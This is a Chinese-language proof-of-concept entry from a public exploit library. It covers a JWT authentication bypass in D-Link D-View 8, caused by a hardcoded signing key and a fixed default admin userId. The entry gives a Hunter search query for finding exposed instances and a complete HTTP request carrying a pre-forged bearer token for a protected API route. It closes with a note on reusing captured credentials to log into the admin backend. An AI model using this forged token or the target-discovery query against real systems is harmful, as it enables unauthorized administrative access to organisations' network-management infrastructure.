---
fofa: "web.title="
source: "wy876 漏洞文库"
---

# D-Link D-View 8 JWT认证绕过漏洞

# 一、漏洞简介
D-Link D-View 8是一款高度可定制且易于扩展的网络管理软件，可为任何规模的企业网络基础设施提供端到端的可管理性，支持多厂商设备监控和流量管理，提供实时网络概览和远程位置集中管理等功能。D-Link D-View 8在v2.0.1.28及之前版本中存在硬编码密钥漏洞，由于默认情况下，初始管理员的userId是相同的，未授权攻击者可以利用JWT密钥配合该userId伪造令牌，从而访问受保护的API路由。

# 二、影响版本
+ D-Link D-View 8

# 三、资产测绘
+ hunter`web.title="D-View 8"`
+ 特征


# 四、漏洞复现
```plain
GET /dview8/api/usersByLevel HTTP/1.1
Host: xx.xx.xx.xx
Authorization: eyJhbGciOiAiSFMyNTYiLCJ0eXAiOiAiand0In0.eyJvcmdJZCI6ICIxMjM0NTY3OC0xMjM0LTEyMzQtMTIzNC0xMjM0NTY3ODA5YWEiLCJ1c2VySWQiOiAiNTkxNzFkNTYtZTZiNC00Nzg5LTkwZmYtYTdhMjdmZDQ4NTQ4IiwidHlwZSI6IDMsImtleSI6ICIxMjM0NTY3OC0xMjM0LTEyMzQtMTIzNC0xMjM0NTY3ODkwYmIiLCJpYXQiOiAxNjg2NzY1MTk4LCJqdGkiOiAiZmRhOGU1YzNlNWY1MTQ5MDMzZThiM2FkNWI3ZDhjMjUiLCJuYmYiOiAxNjg2NzYxNTk4LCJleHAiOiAxODQ0NDQ1MTk4fQ.5swhQdiev4r8ZDNkJAFVkGfRTIaUQlwVue2AI18CrcI
```


可通过获取的账号密码抓取登录数据包，替换用户名及加密密码后登录后台


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/usw057398ry1de8p>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
